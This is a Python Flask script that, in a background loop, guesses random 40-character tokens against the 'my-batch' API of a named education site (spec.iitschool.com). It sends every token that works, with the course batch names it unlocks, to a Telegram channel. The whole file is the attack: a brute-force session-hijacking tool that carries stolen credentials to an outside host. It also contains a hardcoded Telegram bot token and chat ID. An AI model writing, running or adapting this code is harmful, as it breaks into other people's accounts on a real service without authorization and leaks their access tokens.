from flask import Flask, jsonify
import random
import string
import requests
from telegram import Bot
import threading
import time

# Initialize Flask app
app = Flask(__name__)

# Telegram Bot setup
TELEGRAM_BOT_TOKEN = '7853203368:AAE801naC4GMeyrkEfyflPItRwMvLmQddPY'
CHANNEL_CHAT_ID = '-1002478793346'  # Replace with your channel ID or username
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Function to generate a random 40-character token
def generate_random_token():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))

# Function to check tokens and send to Telegram if valid
def check_tokens():
    while True:
        token = generate_random_token()
        url = "https://spec.iitschool.com/api/v1/my-batch"
        
        headers = {
            'Accept': 'application/json',
            'origintype': 'web',
            'token': token,
            'usertype': '2',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json().get('data', {})
            batch_data = data.get('batchData', [])
            if batch_data:
                for batch in batch_data:
                    batch_name = batch.get('batchName', 'N/A')
                    batch_id = batch.get('id', 'N/A')
                    # Send to Telegram
                    send_to_telegram(token, batch_name, batch_id)
        time.sleep(1)  # Check every 1 second

# Function to send a message to the Telegram channel
def send_to_telegram(token, batch_name, batch_id):
    message = f"Token: {token}\n{batch_name} - {batch_id}"
    bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)

# Health check route (optional for monitoring purposes)
@app.route('/health', methods=['GET'])
def health_check():
    return "OK", 200

if __name__ == '__main__':
    # Start the background thread for token checking
    threading.Thread(target=check_tokens, daemon=True).start()
    # Run the Flask app
    app.run(host='0.0.0.0', port=8080)
